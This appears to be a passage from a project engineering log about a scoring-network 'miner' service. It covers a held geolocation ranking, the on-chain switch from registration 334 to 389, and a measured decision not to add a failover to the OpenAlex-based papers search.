**Not changed, and the reasons are the point.** The restatement is this project's largest measured
scoring effect (18.8x on SSL, epoch 292's autopsy) — but IP_GEOLOCATION is rank 1 by **+0.1%**, the
thinnest margin on the board, and it already scores **0.9956**, well above the cliff, with whatever
shape the engine elicits today. If the engine sends `ip`, then geo is crossing the cliff *without*
a restatement, and adding one is a wording change of unknown sign — and the tail-trim sweep already
established that geo wording changes can *lose* crossings. G24 removed the ability to measure it
offline. Changing a held rank-1 on an unverifiable theory hours before scoring is the trade the
seven-intent audit explicitly warns against.

**The experiment to run after the close, not before it:** turn on `LOG_QUERY=on` for one epoch and
read which parameters the engine actually fills on this route. That single fact decides it — if the
engine sends `query`, this is already a no-op and the divergence is theoretical; if it sends `ip`,
the fix is to separate subject from question exactly as `/ssl-check` does, and it should then be
benched before shipping.

Guarded by `tools/no-regression.mjs`, which expects **7 identical, 1 differing** until then.

### G36 · Registration 334 is superseded by **389** — `CLOSED 2026-08-31: mined, active, ten intents`

`updateMiner(334, …)` mined at 2026-08-31T04:01Z, tx
`0x5de3965e2b08cd74b7e240faccb626d41e1003e9e5ec51cf220f76a5fe4ffe1d`. Registration **389** is
`active`, `rejection_reason: null`, `retrying: false`, `fetch_attempts: 0`, serving all ten intents.
`REGISTRATION_ID` is updated so the uptime tripwire watches it.

**Two facts worth keeping, both of which briefly looked like failures:**

1. **The indexer lagged about four minutes.** `/api/miners/389` answered
   `miner registration not found` for four minutes after the transaction was mined, while
   `/api/miners/334` still served the OLD seven-intent record with the old IPFS URL. Neither meant
   anything had gone wrong. The receipt was authoritative and correct immediately: its
   `MinerRegistered` log carried id `0x185` (389), hash `78932fb1…`, and all ten intent strings.
   **In the first five minutes after an update, read the receipt logs, not the API.**
2. **The hash to sign is the HOSTED bytes, never the local file.** The working copy is CRLF and git
   stores LF, so `track1-miner/miner.yaml` hashes `460bc310…` on disk while the bytes GitHub serves
   hash `78932fb1…`. Telegraph fetches the URL and compares against the signed hash, so signing the
   local one would have failed activation outright. `tools/sign-update.sh` does this correctly.

**Two changes of dependency this introduces, neither yet a problem:**

- The manifest is now served from a **commit-pinned GitHub raw URL**, not IPFS. Immutable while the
  repo exists, but a force-push that orphans commit `74ad4a1` would break the fetch and the miner
  would fail its next manifest check. **Do not rewrite that history.**
- **Track 2 must update its disclosure documents.** `track2/SUBMISSION.md`, `track2/GAPS.md`,
  `track2/MEMORY.md` and `track2/X_THREAD.md` all cite registration 334 as the live miner. That is
  now wrong. This is flagged here rather than fixed because this file's rules forbid editing
  `../track2/`.

**Also corrected here:** `tools/upstream-health.mjs` was reporting `ip-api.com` as a failing
**primary**. It is not — it is TCP-blocked from the dev machine (G27), so the direct probe was a
false alarm. It is now checked *through production*, where the answer identifies the provider:
only ip-api honours operator geofeeds and places `142.251.42.174` in Tokyo, where the ipwho.is
fallback misplaces it in Mumbai. Production returns Tokyo, so the primary is answering.

### G37 · `/papers` has one upstream and no failover — `OPEN, and adding one was measured and REJECTED`

`findPapers` calls OpenAlex alone. When it fails, the handler answers honestly that the search
could not be retrieved, which scores ~0 for that question — and `ACADEMIC_SEARCH` is contested
(ratio 0.740 in epoch 295). A failover looked obviously worth adding. **It is not.** Every
candidate was measured on 2026-08-31:

- **Crossref** — reachable and keyless, but neither sort mode is usable. `sort=relevance` returns
  metadata-poor stubs ("CRISPR/Cas9 gene editing", no authors, no year, 1 citation) where OpenAlex
  returns the real literature. `sort=is-referenced-by-count` returns hugely-cited papers that are
  **off topic**: for a CRISPR query it gave qPCR analysis (164,146 cites), GSEA, and edgeR. That is
  the confidently-wrong failure mode the `SPORTS_SCORE` precedent exists to refuse. It also leaks
  markup into titles (`<tt>edgeR</tt>`).
- **Semantic Scholar** — **HTTP 429 without an API key.** This is not a guess: the
  `semanticscholar` miner fails in the live leaderboard with `upstream call failed: status 4xx`.
- **arXiv** — preprints only, and no citation counts. The recorded questions ask for peer-reviewed
  work and cite counts.

**And the premise was wrong anyway.** OpenAlex looked flaky because it failed twice during this
session — but both failures happened while five gates hammered it concurrently. Probed properly:
**6/6 sequential 200s**, and production `/papers` returned 5 papers on 4 of 4 topics with no error.
The flakiness was self-inflicted, the same effect noted in G34.

So an honest "could not be retrieved" from a reliable single provider beats a second provider that
answers off-topic. Revisit only with a provider that matches OpenAlex on relevance AND metadata —
or with an API key, which introduces a revocable dependency the manifest currently has none of.
